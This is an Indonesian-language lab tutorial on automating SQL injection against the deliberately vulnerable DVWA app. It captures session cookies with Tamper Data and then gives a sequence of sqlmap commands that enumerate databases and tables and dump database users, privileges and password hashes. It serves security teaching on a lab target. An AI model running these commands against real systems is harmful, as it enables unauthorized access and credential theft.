# Lesson 7 - Automate SQL Injection with SqlMap 


## Set DVWA dengan low Security

1. Login pada dvwa
	* username: admin
	* password: password
2. Lalu set Security menjadi low
	* klik "DVWA security"
	* set menjadi *low*

![1 set fedora low](https://user-images.githubusercontent.com/17487644/34214252-7e60bd60-e5d4-11e7-98bf-1cef8db4e81f.png)

## Manual SQL injection
1. pilih "sql injection" pada sidebar

![1 masuk ek sql injection dvwa](https://user-images.githubusercontent.com/17487644/34217302-c13eb264-e5dd-11e7-85c0-7e2f72a1c9b9.png)

2. Buka Tamper data

![2 tamper data](https://user-images.githubusercontent.com/17487644/34217303-c175fd5a-e5dd-11e7-93f4-c94401f5c452.png)

3. lalu masukan 1 pada user id
4. lalu copy get yang kedua pada hasil tamper data, pada data referer-nya

![3 copy referer](https://user-images.githubusercontent.com/17487644/34217305-c1ad2546-e5dd-11e7-8379-962c1d352e2f.png)

5. buka notepad

![4 buka notepad](https://user-images.githubusercontent.com/17487644/34217306-c20c56a6-e5dd-11e7-9f9f-6befa5832a31.png)

6. paste referer

![5 paste referer](https://user-images.githubusercontent.com/17487644/34217307-c243a66a-e5dd-11e7-8c34-dd96fd1be8f2.png)

7. buka hasil tamper data, lalu copy cookies

![6 copy cookies](https://user-images.githubusercontent.com/17487644/34217308-c27a0ffc-e5dd-11e7-858f-6e54d0b8accb.png)

8. paste pada notepad sebelumnya

![7 referer cookies notepad](https://user-images.githubusercontent.com/17487644/34217310-c2b0e4b4-e5dd-11e7-8af6-d7c0e873b525.png)

9. mengecek sqlmap.py:
	* buka terminal
	* pindahkan pada direktori:
		cd pentest/database/sqlmap
	* cek apakah sqlmap.py ada:
		ls -l sqlmap.py

![8 mengecek sqlmap py](https://user-images.githubusercontent.com/17487644/34217311-c2e7d92e-e5dd-11e7-9a5f-86da7fe6f840.png)

10. jalankan sqlmap.py
	1. ./sqlmap.py -u "http://<IP fedora>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<Cookies>; security=low" -b --current-db --current-user
	2. keep testing? y
	3. skip payload? y

![9 sqlmap command](https://user-images.githubusercontent.com/17487644/34217312-c31f980a-e5dd-11e7-9fc9-0e2dbb3c3aae.png)

![10 continue test and skip payload](https://user-images.githubusercontent.com/17487644/34217315-c35accc2-e5dd-11e7-85db-242a0ad7636b.png)

11. hasil dari sqlmap dapat melihat user yang sedang menggunakan, dan database yang digunakan

![11 current user](https://user-images.githubusercontent.com/17487644/34217318-c43e7724-e5dd-11e7-8a73-28ccaaed7ff9.png)

12. mendapatkan db username dan password, masukan command:
	* ./sqlmap.py -u "http://<IP fedora>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="<Cookies>=lpb5g4uss9kp70p8jccjeks621; security=low" --string="Surname" --users --password

![12 show username](https://user-images.githubusercontent.com/17487644/34217319-c4758ebc-e5dd-11e7-964d-df687d517916.png)

13. hasilnya:

![13 username and password hash](https://user-images.githubusercontent.com/17487644/34217321-c51470c2-e5dd-11e7-8e37-8a45977bbd33.png)

14. mendapat privilege dari user yang telah dipecahkan passwordnya (Aldi_Haxx), masukan command:
	* ./sqlmap.py -u "http://<IP fedora>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<Cookies>; security=low" -U db_hacker --privileges

![14 lihat privileges aldi](https://user-images.githubusercontent.com/17487644/34217322-c5cca818-e5dd-11e7-8d78-1e0223aa770c.png)

15. dapatkan list nama-nama semua db, masukan command:
	* ./sqlmap.py -u "http://<IP fedora>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<Cookies>; security=low" --dbs

![15 lihat semua db yg ada](https://user-images.githubusercontent.com/17487644/34217324-c655b8b0-e5dd-11e7-9153-26d4674a8d4c.png)

16. dapatkan tabel dvwa, masukan command:
	* ./sqlmap.py -u "http://192.168.1.106/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa --tables

![16 command lihat db dvwa](https://user-images.githubusercontent.com/17487644/34217325-c690be7e-e5dd-11e7-8907-75742d53e976.png)

17. dapatkan isi db dvwa, masukan command:
	* ./sqlmap.py -u "http://192.168.1.106/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns

![17 tabel dvwa](https://user-images.githubusercontent.com/17487644/34217326-c70cc7bc-e5dd-11e7-81cf-3f609070d27d.png)

18. temukan nama kolom tabel user, masukan command:
	* ./sqlmap.py -u "http://192.168.1.106/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns

![18 command lihat colom tabel users](https://user-images.githubusercontent.com/17487644/34217327-c74897a6-e5dd-11e7-9a88-486c39ef794c.png)

![19 kolom users](https://user-images.githubusercontent.com/17487644/34217328-c7b34614-e5dd-11e7-9f8f-62546fae7ee9.png)

19. lihat username dan password di tabel user
	* ![20 lihat useername dan password dvwa](https://user-images.githubusercontent.com/17487644/34217329-c7eef4d4-e5dd-11e7-819c-a8acad8143a7.png)

![20 lihat useername dan password dvwa](https://user-images.githubusercontent.com/17487644/34217329-c7eef4d4-e5dd-11e7-819c-a8acad8143a7.png)

![21 hasil username dan password](https://user-images.githubusercontent.com/17487644/34217330-c86dbcb0-e5dd-11e7-8ad3-a644c1b71d6a.png)

## Hasil akhir lesson 7

![22 hasil akhir](https://user-images.githubusercontent.com/17487644/34217331-c92aed1c-e5dd-11e7-81da-4295b47c2bdb.png)